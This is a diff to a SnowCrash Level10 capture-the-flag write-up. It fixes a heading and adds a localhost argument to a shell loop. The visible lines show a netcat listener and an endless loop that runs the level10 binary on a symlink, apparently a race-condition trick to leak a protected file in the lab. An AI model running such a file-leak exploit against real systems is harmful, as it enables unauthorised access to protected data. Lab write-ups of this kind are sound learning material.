@@ -1,4 +1,4 @@
-#SnowCrash Level10
+# SnowCrash Level10
 
 A simple strings would give us the following :
 ```
@@ -55,5 +55,5 @@ level10@SnowCrash:~$ nc -lk 6969 >> /tmp/level10/to_read
 
 And now an infinite loop for our level10 binary.
 ```
-level10@SnowCrash:~$ while true; do ./level10 /tmp/level10/symlink; done
+level10@SnowCrash:~$ while true; do ./level10 /tmp/level10/symlink 127.0.0.1; done
 ```
